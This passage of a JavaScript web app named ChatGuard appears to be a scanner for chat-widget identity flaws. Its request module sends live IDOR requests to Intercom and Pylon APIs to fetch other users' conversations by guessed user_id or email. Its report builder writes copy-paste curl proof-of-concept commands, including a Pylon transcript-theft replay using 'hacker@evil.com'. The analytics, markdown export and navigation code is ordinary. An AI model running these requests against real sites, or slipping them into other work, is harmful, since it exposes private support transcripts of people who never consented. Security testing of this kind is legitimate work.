      if (panel) panel.innerHTML = `<span style="color:var(--vulnerable-red)">Request failed: ${e.message}\n\nThis may be due to:\n• Invalid app_id\n• Browser CORS policy blocking the request\n• Network error\n\nTip: Use the cURL or Python format to send from a terminal instead.</span>`;
      setBadge('FAILED', false);
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = '▶ Send Real Request'; }
    }
  }

  // A01 — POST /messenger/web/conversations (user_id IDOR)
  async function sendIntercomMessages(appId, userId) {
    setStatus('POST → api-iam.intercom.io/messenger/web/conversations', 'loading');
    const body = new URLSearchParams({
      app_id: appId,
      user_data: JSON.stringify({ user_id: userId }),
      blocks: JSON.stringify([{type:'paragraph',text:'ChatGuard_Test'}])
    });
    const res = await fetch('https://api-iam.intercom.io/messenger/web/conversations', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://app.example.com',
      },
      body: body.toString()
    });
    const text = await res.text();
    let parsed;
    try { parsed = JSON.parse(text); } catch { parsed = text; }
    const ok = res.ok || res.status === 200;
    const isVuln = ok && (parsed?.conversation_parts || parsed?.type || Array.isArray(parsed));
    setStatus(isVuln ? '🔴 Vulnerable — data returned without HMAC' : `HTTP ${res.status}`, isVuln ? 'err' : 'ok');
    showRealResponse(parsed, res.status, !isVuln);
  }

  // A02 — POST /messenger/web/conversations
  async function sendIntercomConversations(appId, email) {
    setStatus('POST → api-iam.intercom.io/messenger/web/conversations', 'loading');
    const body = new URLSearchParams({
      app_id: appId,
      user_data: JSON.stringify({ email }),
      blocks: JSON.stringify([{type:'paragraph',text:'ChatGuard_Test'}])
    });
    const res = await fetch('https://api-iam.intercom.io/messenger/web/conversations', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://app.example.com',
      },
      body: body.toString()
    });
    const text = await res.text();
    let parsed;
    try { parsed = JSON.parse(text); } catch { parsed = text; }
    const isVuln = res.ok && parsed?.conversations;
    setStatus(isVuln ? '🔴 Vulnerable — conversations returned without HMAC' : `HTTP ${res.status}`, isVuln ? 'err' : 'ok');
    showRealResponse(parsed, res.status, !isVuln);
  }

  // A03 Step 1 — GET /chatwidget/unreads
  async function sendPylonUnreads(appId, email) {
    setStatus('GET → apichatwidget.usepylon.com/chatwidget/unreads', 'loading');
    const params = new URLSearchParams({ app_id: appId, email });
    const res = await fetch(`https://apichatwidget.usepylon.com/chatwidget/unreads?${params}`, {
      method: 'GET',
      headers: { 'Accept': '*/*' }
    });
    const text = await res.text();
    let parsed;
    try { parsed = JSON.parse(text); } catch { parsed = text; }
    const issueId = parsed?.data?.issues?.[0]?.issue_id;
    const isVuln = res.ok && issueId;
    if (isVuln) {
      // Auto-populate a03 step 2 would use this issueId — store it
      window._pylonLeakedIssueId = issueId;
      setStatus(`🔴 Leaked issue_id: ${issueId} — proceed to Step 2`, 'err');
    } else {
      setStatus(`HTTP ${res.status}`, 'ok');
    }
    showRealResponse(parsed, res.status, !isVuln);
  }

  // A03 Step 2 — GET /chatwidget/issue
  async function sendPylonIssue(appId, attackerEmail) {
    // Step 2 only makes sense once Step 1 (unreads) has leaked a real
    // issue_id. Without one there is nothing to dereference, so guard
    // instead of falling back to a bogus placeholder UUID.
    const issueId = window._pylonLeakedIssueId;
    if (!issueId) {
      setStatus('No leaked issue_id yet — run Step 1 (unreads) first', 'err');
      return;
    }
    setStatus(`GET → /chatwidget/issue?issue_id=${issueId.slice(0,8)}…`, 'loading');
    const params = new URLSearchParams({ app_id: appId, email: attackerEmail, issue_id: issueId });
    const res = await fetch(`https://apichatwidget.usepylon.com/chatwidget/issue?${params}`, {
      method: 'GET',
      headers: { 'Accept': '*/*' }
    });
    const text = await res.text();
    let parsed;
    try { parsed = JSON.parse(text); } catch { parsed = text; }
    const isVuln = res.ok && (parsed?.messages || parsed?.title);
    setStatus(isVuln ? '🔴 Vulnerable — transcript returned for mismatched email' : `HTTP ${res.status}`, isVuln ? 'err' : 'ok');
    showRealResponse(parsed, res.status, !isVuln);
  }

  return { send, syntaxHighlight };
})();

// ──────────────────────────────────────────────────
// analytics.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// Analytics
// ══════════════════════════════════════════════════
const Analytics = (() => {
  // Animated count-up for the metric numbers (CSP-safe: lives in app.js, script-src 'self').
  // Honors prefers-reduced-motion by snapping straight to the final value.
  function countUp(nodes) {
    const reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    nodes.forEach(el => {
      const target = parseInt(el.getAttribute('data-count'), 10) || 0;
      if (reduce || target === 0) { el.textContent = String(target); return; }
      const duration = 900;
      const start = performance.now();
      let done = false;
      const tick = (now) => {
        if (done) return;
        const t = Math.min((now - start) / duration, 1);
        const eased = 1 - Math.pow(1 - t, 3); // easeOutCubic
        el.textContent = String(Math.round(eased * target));
        if (t < 1) requestAnimationFrame(tick);
        else done = true;
      };
      requestAnimationFrame(tick);
      // Safety net: if rAF is ever throttled (e.g. background tab), guarantee the
      // final value is shown so the metric never strands at 0. Mirrors the
      // intro-splash hardHide fallback.
      setTimeout(() => { if (!done) { done = true; el.textContent = String(target); } }, duration + 150);
    });
  }

  function render() {
    const history = Storage.getHistory();
    const total = history.length;
    const vuln = history.filter(s => s.vulnerable).length;
    const secure = total - vuln;
    const intercom = history.filter(s => s.vendor === 'Intercom').length;
    const pylon = history.filter(s => s.vendor === 'Pylon').length;

    const mc = document.getElementById('analyticsMetrics');
    if (mc) {
      mc.innerHTML = `
      <div class="metric-card"><div class="metric-label">Total Scans</div><div class="metric-value blue" data-count="${total}">0</div></div>
      <div class="metric-card"><div class="metric-label">Vulnerable</div><div class="metric-value red" data-count="${vuln}">0</div></div>
      <div class="metric-card"><div class="metric-label">Secure</div><div class="metric-value green" data-count="${secure}">0</div></div>
      <div class="metric-card"><div class="metric-label">Intercom Sites</div><div class="metric-value amber" data-count="${intercom}">0</div></div>
      <div class="metric-card"><div class="metric-label">Pylon Sites</div><div class="metric-value blue" data-count="${pylon}">0</div></div>
    `;
      countUp(mc.querySelectorAll('.metric-value'));
    }

    const ac = document.getElementById('analyticsCharts');
    if (!ac) return;
    const pct = (n) => total ? Math.round(n / total * 100) : 0;
    const barRow = (label, count, color, pctVal) =>
      `<div class="bar-row"><span class="bar-label">${label}</span><div class="bar-track"><div class="bar-fill" style="width:${pctVal}%;background:${color};color:${color}"></div></div><span class="bar-count">${count}</span></div>`;

    // Animated SVG donut: share of scans that came back secure. Inline SVG keeps
    // it CSP-safe (img-src blocks external images); the ring draws itself in via a
    // pure-CSS stroke-dashoffset keyframe, and the center % uses the count-up tween.
    const CIRC = 326.726;                       // 2·π·52 (the ring radius)
    const securePct = pct(secure);
    const frac = total ? secure / total : 0;
    const ringOffset = (CIRC * (1 - frac)).toFixed(2);
    const ringColor = securePct >= 70 ? 'var(--secure-green)'
                    : securePct >= 40 ? 'var(--warn-amber)'
                    : 'var(--vulnerable-red)';
    const donut = `
      <div class="donut-card">
        <div class="chart-bar-title">Security posture</div>
        <div class="donut-wrap">
          <svg class="donut-svg" viewBox="0 0 120 120" role="img" aria-label="${securePct}% of scans secure">
            <circle class="donut-track" cx="60" cy="60" r="52"></circle>
            <circle class="donut-value" cx="60" cy="60" r="52" style="color:${ringColor};stroke:${ringColor};stroke-dasharray:${CIRC};--ring-circ:${CIRC};--ring-offset:${ringOffset}"></circle>
          </svg>
          <div class="donut-center">
            <span class="donut-pct"><span data-count="${securePct}">0</span>%</span>
            <span class="donut-sub">secure</span>
          </div>
        </div>
      </div>`;

    ac.innerHTML = total === 0
      ? '<div class="empty-state">Run some scans to see analytics data.</div>'
      : `
      <div class="chart-grid">
        ${donut}
        <div class="chart-bar-wrap">
          <div class="chart-bar-title">Scan results breakdown</div>
          ${barRow('Vulnerable', vuln, 'var(--vulnerable-red)', pct(vuln))}
          ${barRow('Secure', secure, 'var(--secure-green)', pct(secure))}
          ${barRow('Intercom', intercom, 'var(--accent)', pct(intercom))}
          ${barRow('Pylon', pylon, 'var(--accent-purple)', pct(pylon))}
        </div>
      </div>`;

    if (total > 0) countUp(ac.querySelectorAll('.donut-pct [data-count]'));
  }
  return { render };
})();

// ──────────────────────────────────────────────────
// report.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// Report Manager
// ══════════════════════════════════════════════════
const ReportManager = (() => {
  // Strip HTML span tags from template output to get plain text for code blocks
  function stripHtml(s) {
    return String(s || '').replace(/<[^>]+>/g, '');
  }

  // Escape a value for safe use inside a Markdown table cell — an unescaped
  // pipe ends the column and a newline ends the row, both of which corrupt
  // the rendered table.
  function mdCell(s) {
    return String(s == null ? '' : s)
      .replace(/\|/g, '\\|')
      .replace(/\r?\n/g, ' ')
      .trim();
  }

  // Wrap text as an inline code span, choosing a backtick fence longer than
  // any run of backticks inside the text (the CommonMark rule). This keeps a
  // stray backtick in an evidence snippet from prematurely closing the span.
  function mdInlineCode(s) {
    const text = String(s == null ? '' : s).replace(/\r?\n/g, ' ').trim();
    const runs = text.match(/`+/g) || [];
    const longest = runs.reduce((m, r) => Math.max(m, r.length), 0);
    const fence = '`'.repeat(longest + 1);
    const pad = longest > 0 ? ' ' : '';
    return `${fence}${pad}${text}${pad}${fence}`;
  }

  // Inline code that is ALSO safe inside a table cell: pipes must still be
  // backslash-escaped at the table-parsing stage even within a code span.
  function mdCellCode(s) {
    return mdInlineCode(String(s == null ? '' : s).replace(/\|/g, '\\|'));
  }

  function buildMd() {
    const scan = ScannerEngine.getCurrentScan();
    const ts   = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
    const target  = scan?.url   || '(no scan loaded)';
    const vendor  = scan?.vendor || 'Unknown';
    const appId   = scan?.appId  || 'not found';
    const hmac    = scan?.hasHmac;
    const status  = scan?.securityStatus || (hmac ? 'SECURE' : 'VULNERABLE');
    const evidence = (scan?.securityEvidence || []).map(e => (e.snippet || e)).slice(0, 3);
    const findings = scan?.findings || [];

    const lines = [];

    // ── Professional header ────────────────────────────
    lines.push('# ChatGuard Security Report');
    lines.push('');
    lines.push('> **Automated Chat Widget Security Analysis**');
    lines.push(`> Generated: \`${ts}\`  `);
    lines.push(`> Tool: ChatGuard v3.0 — [github.com/chatguard](https://github.com)`);
    lines.push('');
    lines.push('---');
    lines.push('');

    // ── Summary table ──────────────────────────────────
    lines.push('## Summary');
    lines.push('');
    lines.push('| Field | Value |');
    lines.push('|-------|-------|');
    lines.push(`| **Target** | ${mdCellCode(target)} |`);
    lines.push(`| **Vendor** | ${mdCell(vendor)} |`);
    lines.push(`| **App ID** | ${mdCellCode(appId)} |`);
    lines.push(`| **Findings** | ${findings.length} finding(s) |`);
    lines.push(`| **HMAC / Identity Verification** | ${hmac ? '✅ Detected' : '❌ Not found'} |`);
    lines.push(`| **Overall Status** | ${status === 'SECURE' ? '🔒 SECURE' : '⚠️ VULNERABLE'} |`);
    lines.push('');

    // ── Security Verdict ───────────────────────────────
    lines.push('## Security Verdict');
    lines.push('');
    if (hmac) {
      lines.push('### 🔒 SECURE — Identity Verification Detected');
      lines.push('');
      lines.push('HMAC / Identity Verification signals were found in the target source. '
        + 'This indicates the site has implemented cryptographic identity verification. '
        + 'Requests without a valid `user_hash` / `email_hash` will likely be rejected by the server.');
      if (evidence.length) {
        lines.push('');
        lines.push('**Evidence found:**');
        evidence.forEach(e => lines.push(`- ${mdInlineCode(stripHtml(e))}`));
      }
    } else {
      lines.push('### ⚠️ VULNERABLE — No HMAC Detected');
      lines.push('');
      lines.push('No HMAC or Identity Verification signals were found in the fetched source. '
        + 'The chat widget appears to accept requests without cryptographic identity proof, '
        + 'enabling IDOR attacks against user conversations and support transcripts.');
    }
    lines.push('');

    // ── Findings ───────────────────────────────────────
    if (findings.length) {
      lines.push('## Findings');
      lines.push('');
      lines.push('| ID | Title | CVSS | Endpoint | Parameter |');
      lines.push('|----|-------|------|----------|-----------|');
      findings.forEach(f => {
        const s = TemplateManager.summaries[f.id?.toLowerCase()] || f;
        lines.push(`| ${mdCellCode(s.id || f.id)} | ${mdCell(s.title || f.title)} | **${mdCell(s.cvss || f.cvss)} HIGH** | ${mdCellCode(s.endpoint || f.endpoint)} | ${mdCellCode(s.param || f.param)} |`);
      });
      lines.push('');

      // Detail section per finding
      findings.forEach(f => {
        const s = TemplateManager.summaries[f.id?.toLowerCase()] || f;
        lines.push(`### ${s.id || f.id} — ${s.title || f.title}`);
        lines.push('');
        lines.push(`- **CVSS Score:** ${s.cvss || f.cvss} HIGH`);
        if (s.vuln) lines.push(`- **CVSS Vector:** ${mdInlineCode(s.vuln)}`);
        lines.push(`- **API Host:** ${mdInlineCode(s.api || 'see above')}`);
        lines.push(`- **Endpoint:** ${mdInlineCode(s.endpoint || f.endpoint)}`);
        lines.push(`- **Vulnerable Parameter:** ${mdInlineCode(s.param || f.param)}`);
        if (s.exposed) lines.push(`- **Exposed Data:** ${s.exposed}`);
        lines.push('');
        if (s.rec) {
          lines.push('**Recommendation:**');
          lines.push('');
          lines.push(`> ${s.rec}`);
          lines.push('');
        }
      });
    } else {
      lines.push('## Findings');
      lines.push('');
      lines.push('✅ No IDOR findings detected for this target.');
      lines.push('');
    }

    // ── Generated PoC Requests ─────────────────────────
    // Resolve concrete values captured during the active scan / Inspector
    // session so the exported commands are copy-paste ready — no raw
    // template tags ({APP_ID}, {EMAIL}, …) ever reach the rendered report.
    // Each value falls back through: live Inspector input → scan result →
    // saved settings → a clean, realistic demo default.
    const settings  = (typeof Storage !== 'undefined' && Storage.getSettings) ? Storage.getSettings() : {};
    const liveVal   = id => (typeof document !== 'undefined' && document.getElementById(id)?.value?.trim()) || '';
    const pocAppId  = liveVal('liveAppId')  || (scan?.appId && appId !== 'not found' ? appId : '') || 'cgdemo01';
    const pocUserId = liveVal('liveUserId') || (settings.userIdType === 'uuid'
                        ? 'a3f5b291-7c3d-4e88-b012-9f1234567890' : '85070');
    const pocEmail  = liveVal('liveEmail')  || settings.email || 'victim@example.com';
    const pocIssue  = liveVal('liveIssueId') || '4a53f4bb-b4c9-40f4-8b2a-000000019921';

    lines.push('## Proof-of-Concept Requests');
    lines.push('');
    lines.push('> The commands below are pre-filled with the parameters discovered during this scan and are ready to run as-is.');
    lines.push('');

    if (vendor === 'Intercom' || !vendor || vendor === 'Unknown') {
      lines.push('### A01 — user_id IDOR');
      lines.push('');
      lines.push('```bash');
      lines.push('curl -X POST https://api-iam.intercom.io/messenger/web/conversations \\');
      lines.push('  -H "Content-Type: application/x-www-form-urlencoded" \\');
      lines.push(`  --data-urlencode 'app_id=${pocAppId}' \\`);
      lines.push(`  --data-urlencode 'user_data={"user_id":"${pocUserId}"}' \\`);
      lines.push(`  --data-urlencode 'blocks=[{"type":"paragraph","text":"ChatGuard_Test"}]'`);
      lines.push('```');
      lines.push('');
      lines.push('### A02 — email IDOR');
      lines.push('');
      lines.push('```bash');
      lines.push('curl -X POST https://api-iam.intercom.io/messenger/web/conversations \\');
      lines.push('  -H "Content-Type: application/x-www-form-urlencoded" \\');
      lines.push(`  --data-urlencode 'app_id=${pocAppId}' \\`);
      lines.push(`  --data-urlencode 'user_data={"email":"${pocEmail}"}' \\`);
      lines.push(`  --data-urlencode 'blocks=[{"type":"paragraph","text":"ChatGuard_Test"}]'`);
      lines.push('```');
    }

    if (vendor === 'UsePylon' || vendor === 'Pylon') {
      lines.push('### A03 — Pylon issue_id Leak (Step 1)');
      lines.push('');
      lines.push('Enumerate the internal `issue_id` for any supplied email — information disclosure.');
      lines.push('');
      lines.push('```bash');
      lines.push('curl -G https://apichatwidget.usepylon.com/chatwidget/unreads \\');
      lines.push(`  --data-urlencode 'app_id=${pocAppId}' \\`);
      lines.push(`  --data-urlencode 'email=${pocEmail}'`);
      lines.push('```');
      lines.push('');
      lines.push('### A03 — Pylon Transcript Theft (Step 2)');
      lines.push('');
      lines.push('Replay the leaked `issue_id` with an attacker-controlled email — the server validates `issue_id` OR `email`, not both, returning the full transcript.');
      lines.push('');
      lines.push('```bash');
      lines.push('curl -G https://apichatwidget.usepylon.com/chatwidget/issue \\');
      lines.push(`  --data-urlencode 'app_id=${pocAppId}' \\`);
      lines.push(`  --data-urlencode 'email=hacker@evil.com' \\`);
      lines.push(`  --data-urlencode 'issue_id=${pocIssue}'`);
      lines.push('```');
    }

    lines.push('');
    lines.push('---');
    lines.push('');
    lines.push('*Generated by ChatGuard v3.0 — Automated Chat Widget Security Scanner*');
    return lines.join('\n');
  }

  // ── Convert Markdown to minimal HTML for print window ──────────────
  function mdToHtml(md) {
    // Pull fenced code blocks out FIRST so their contents are never mangled
    // by the inline/heading transforms below — this is what keeps stray
    // backticks and half-converted markup from leaking into the preview.
    // Each block becomes a placeholder and is restored verbatim at the end.
    const codeBlocks = [];
    let html = String(md == null ? '' : md).replace(
      /```[ \t]*([\w-]*)[ \t]*\n([\s\S]*?)```/g,
      (_, lang, code) => {
        const i   = codeBlocks.length;
        const cls = lang ? ` class="lang-${lang}"` : '';
        codeBlocks.push(`<pre><code${cls}>${escapeHtml(code.replace(/\n$/, ''))}</code></pre>`);
        return `@@CB${i}@@`;
      }
    );

    html = html
      .replace(/^# (.+)$/gm,   '<h1>$1</h1>')
      .replace(/^## (.+)$/gm,  '<h2>$1</h2>')
      .replace(/^### (.+)$/gm, '<h3>$1</h3>')
      .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
      // Inline code: CommonMark variable-length backtick spans. Matches the
      // SAME number of backticks on each side and trims one optional padding
      // space, so a `` `value` `` span emitted by mdInlineCode renders as a
      // clean <code>value</code> with no stray backticks bleeding through.
      .replace(/(`+)[ ]?([\s\S]*?)[ ]?\1/g, (_, _fence, code) => `<code>${escapeHtml(code)}</code>`)
      .replace(/^> (.+)$/gm,   '<blockquote>$1</blockquote>')
      .replace(/^---$/gm,      '<hr>')
      // Tables: header row
      .replace(/^\|(.+)\|\s*\n\|[-| :]+\|\s*\n((?:\|.+\|\s*\n?)*)/gm, (_, hdr, rows) => {
        const ths = hdr.split('|').filter(s=>s.trim()).map(s=>`<th>${s.trim()}</th>`).join('');
        const trs = rows.trim().split('\n').filter(Boolean).map(row => {
          const tds = row.split('|').filter(s=>s.trim()).map(s=>`<td>${s.trim()}</td>`).join('');
          return `<tr>${tds}</tr>`;
        }).join('');
        return `<table><thead><tr>${ths}</tr></thead><tbody>${trs}</tbody></table>`;
      })
      // Bullet lists
      .replace(/^- (.+)$/gm, '<li>$1</li>')
      .replace(/(<li>[\s\S]+?<\/li>)(?!\n?<li>)/g, '<ul>$1</ul>')
      // Paragraphs (blank-line separated)
      .replace(/\n\n(?!<[htu]|<b|<p|<hr)/g, '\n<p>')
      .replace(/\*(.+?)\*/g, '<em>$1</em>');

    // Restore the extracted fenced code blocks. The placeholder does not begin
    // with "<p", so the paragraph pass above may have inserted a stray empty
    // <p> directly in front of each block — strip it so the <pre> stands alone
    // without an orphaned, never-closed paragraph tag, then restore verbatim.
    html = html
      .replace(/<p>\s*(@@CB\d+@@)/g, '$1')
      .replace(/@@CB(\d+)@@/g, (_, i) => codeBlocks[+i]);
    return html;
  }

  function _reportFilename(ext) {
    // Fix 2: clean domain name — https://www.userway.org/path → chatguard_report_userway.org.pdf
    const scan = ScannerEngine.getCurrentScan();
    let domain = 'report';
    if (scan?.url) {
      try { domain = new URL(scan.url).hostname.replace(/^www\./, ''); }
      catch { domain = scan.url.replace(/https?:\/\//,'').split('/')[0]; }
    }
    return `ChatGuard_Report_${domain.replace(/[^a-zA-Z0-9.\-]/g,'_')}.${ext}`;
  }

  function generateReport() {
    const md   = buildMd();
    const body = mdToHtml(md);
    const scan = ScannerEngine.getCurrentScan();
    const hasHmac     = scan?.hasHmac;
    const statusText  = hasHmac ? '🔒 SECURE: HMAC Detected' : '⚠️ VULNERABLE: No HMAC';
    const statusColor = hasHmac ? '#22c55e' : '#ef4444';
    const statusBg    = hasHmac ? '#f0fdf4' : '#fef2f2';
    const statusBdr   = hasHmac ? '#86efac' : '#fca5a5';
    const filename    = _reportFilename('pdf');

    const win = window.open('', '_blank', 'width=920,height=820');
    if (!win) { cgAlert('Pop-up blocked — please allow pop-ups for this page and try again.', 'Pop-up Blocked'); return; }
    win.document.write(`<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<title>${filename.replace('.pdf','')}</title>
<style>
  /* Fix 1: force all backgrounds/colors in print — no white-out of code blocks */
  *{box-sizing:border-box;margin:0;padding:0;-webkit-print-color-adjust:exact;print-color-adjust:exact}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px;line-height:1.7;color:#1a1a1a;padding:2.5rem;max-width:820px;margin:0 auto}
  .report-header{display:flex;align-items:center;gap:1rem;border-bottom:2px solid #0d1117;padding-bottom:1rem;margin-bottom:1.5rem;page-break-inside:avoid}
  .report-header svg{flex-shrink:0}
  .report-header-text h1{font-size:1.4rem;font-weight:800;color:#07090f}
  .report-header-text p{font-size:.8rem;color:#6b7280;margin-top:.125rem}
  .status-banner{display:inline-flex;align-items:center;gap:.5rem;background:${statusBg};border:1px solid ${statusBdr};border-radius:6px;padding:.4rem .9rem;font-weight:700;font-size:.875rem;color:${statusColor};margin-bottom:1.5rem;page-break-inside:avoid}
  h1{font-size:1.35rem;font-weight:700;border-bottom:2px solid #e5e7eb;padding-bottom:.4rem;margin:1.5rem 0 .75rem;page-break-after:avoid}
  h2{font-size:1.05rem;font-weight:700;color:#111827;margin:1.25rem 0 .5rem;page-break-after:avoid}
  h3{font-size:.925rem;font-weight:600;color:#374151;margin:1rem 0 .4rem;page-break-after:avoid}
  p{margin:.5rem 0} strong{font-weight:700} em{font-style:italic}
  /* Fix 1: dark code blocks — keep color in print via print-color-adjust */
  code{
    background:#1e2433;color:#a8d8a8;
    border:1px solid #2d3748;border-radius:3px;
    padding:.1rem .35rem;font-size:.82em;
    font-family:'Cascadia Code',Consolas,monospace;
  }
  /* Fix 1: pre block — dark bg, visible border, no page-split */
  pre{
    background:#1e2433;color:#cdd9e5;
    border:1px solid #2d3748;border-left:3px solid #6366f1;
    border-radius:6px;padding:1rem;
    font-size:.78rem;font-family:'Cascadia Code',Consolas,monospace;
    white-space:pre-wrap;word-break:break-all;margin:.75rem 0;
    page-break-inside:avoid;  /* Fix 1: don't cut code across pages */
  }
  blockquote{border-left:3px solid #6366f1;padding:.25rem .75rem;color:#6b7280;background:#f9fafb;margin:.5rem 0;border-radius:0 4px 4px 0;page-break-inside:avoid}
  table{width:100%;border-collapse:collapse;margin:.75rem 0;font-size:.85rem;page-break-inside:avoid}
  th{background:#f9fafb;border:1px solid #d1d5db;padding:.45rem .65rem;text-align:left;font-weight:600;color:#374151}
  td{border:1px solid #d1d5db;padding:.45rem .65rem;vertical-align:top}
  ul{padding-left:1.5rem;margin:.5rem 0} li{margin:.25rem 0}
  hr{border:none;border-top:1px solid #e5e7eb;margin:1.25rem 0}
  .print-actions{margin-bottom:1.5rem;display:flex;gap:.5rem;flex-wrap:wrap;align-items:center}
  .print-btn{background:#0d1117;color:#00e5ff;border:1px solid #00e5ff;border-radius:6px;padding:.4rem .9rem;cursor:pointer;font-size:.8rem;font-weight:600}
  .print-btn:hover{background:#161b22}
  .print-btn.sec{background:#f0f9ff;color:#0369a1;border-color:#7dd3fc}
  .filename-hint{font-size:.72rem;color:#9ca3af;margin-left:.5rem}
  @media print{
    .print-actions{display:none!important}
    body{padding:1.5rem}
  }
</style>
</head><body>
  <div class="report-header">
    <svg width="42" height="42" viewBox="0 0 100 100" fill="none">
      <defs>
        <linearGradient id="rGrad" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#6366f1"/>
          <stop offset="100%" stop-color="#0ea5e9"/>
        </linearGradient>
      </defs>
      <path d="M50 5L85 22.5V55C85 75 50 95 50 95S15 75 15 55V22.5L50 5Z"
            stroke="url(#rGrad)" stroke-width="5" fill="rgba(99,102,241,0.07)"/>
      <rect x="32" y="34" width="36" height="5" rx="2" fill="url(#rGrad)"/>
      <rect x="38" y="46" width="24" height="5" rx="2" fill="url(#rGrad)" opacity=".7"/>
      <path d="M42 58L50 67L58 58" stroke="url(#rGrad)" stroke-width="4"
            stroke-linecap="round" stroke-linejoin="round" fill="none"/>
    </svg>
    <div class="report-header-text">
      <h1>ChatGuard Security Report</h1>
      <p>Automated Chat Widget IDOR Analysis · ${new Date().toLocaleString()}</p>
    </div>
  </div>
  <div class="print-actions">
    <button class="print-btn" onclick="window.print()">🖨 Print / Save as PDF</button>
    <button class="print-btn sec" onclick="window.close()">✕ Close</button>
    <span class="filename-hint">Suggested filename: <strong>${filename}</strong></span>
  </div>
  <div class="status-banner">${statusText}</div>
  <div class="print-report">${body}</div>
</body></html>`);
    win.document.close();
    win.focus();
  }

  function downloadMd() {
    const md = buildMd();
    const blob = new Blob([md], { type: 'text/markdown;charset=utf-8' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = _reportFilename('md');   // Fix 2: domain-based filename
    a.click();
    URL.revokeObjectURL(a.href);
  }

  function downloadTxt() { downloadMd(); }

  return { generateReport, downloadMd, downloadTxt };
})();

// ──────────────────────────────────────────────────
// nav.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// Navigation
// ══════════════════════════════════════════════════
function showPage(id, btn) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
  document.getElementById('page-' + id)?.classList.add('active');
  if (btn) btn.classList.add('active');
  if (id === 'history') { Storage.renderHistory(); }
  if (id === 'analytics') { Analytics.render(); }
  if (id === 'inspector') { Inspector.render(); }
  if (id === 'settings') { Storage.applySettings(); }
}

// ── Mobile hamburger drawer ──────────────────────
function toggleDrawer() {
  const d = document.getElementById('navDrawer');
  if (!d) return;
  d.classList.toggle('open');
}
function closeDrawer() {
  document.getElementById('navDrawer')?.classList.remove('open');
}
// Sync the desktop tab active state when a drawer item is tapped
function syncDesktopTab(id) {
  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
  // Match by onclick text containing the page id
  document.querySelectorAll('.nav-tab').forEach(t => {
    if (t.getAttribute('onclick')?.includes(`'${id}'`)) t.classList.add('active');
  });
  // Sync drawer tab active state
  document.querySelectorAll('.nav-drawer-tab').forEach(t => {
    t.classList.toggle('active', t.getAttribute('onclick')?.includes(`'${id}'`) ?? false);
  });
}
// Close drawer when clicking outside of it
document.addEventListener('click', (e) => {
  const d = document.getElementById('navDrawer');
  const h = document.getElementById('navHamburger');
  if (d?.classList.contains('open') && !d.contains(e.target) && !h?.contains(e.target)) {
    closeDrawer();
  }
});

// ── Init ──
document.addEventListener('DOMContentLoaded', () => {
  Storage.applySettings();
  Inspector.init();
  Storage.renderHistory();
  Analytics.render();

  // Enter key on the URL input triggers scan
  const urlInput = document.getElementById('targetUrl');
  if (urlInput) {
    urlInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        e.stopImmediatePropagation();
        ScannerEngine.run();
      }
    });
  }
});